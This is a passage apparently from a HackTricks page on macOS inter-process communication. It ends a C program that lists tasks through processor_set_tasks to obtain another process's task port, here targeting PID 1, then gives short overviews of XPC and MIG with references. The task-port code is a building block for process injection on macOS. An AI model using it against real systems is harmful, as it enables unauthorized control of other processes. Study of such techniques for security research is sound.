if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
